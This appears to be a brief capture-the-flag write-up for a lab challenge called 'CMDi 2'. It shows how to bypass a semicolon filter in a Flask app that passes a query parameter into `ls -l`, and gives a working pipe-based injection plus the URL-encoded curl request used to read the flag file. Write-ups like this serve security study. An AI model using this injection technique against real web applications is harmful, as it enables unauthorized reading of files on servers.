# CMDi 2

```shell
cat /challenge/server
```

The Flask app takes a directory as query param (`/stage?output-path`) and executes `ls -l {output-path}`
Can't use previous solution as the server removes ";"

Executing this:

```shell
ls -l / | grep "flag" | awk '{print "/" $NF}' | xargs cat
```

Lists contents of `/`, takes the line with `flag`, prints only the last word "flag" along with a `/`, use this output as an argument of cat

Start the server and use curl:

```shell
curl http://challenge.localhost:80/stage?output-path=%2F%20%7C%20grep%20%22flag%22%20%7C%20awk%20%27%7Bprint%20%22%2F%22%20%24NF%7D%27%20%7C%20xargs%20cat
```
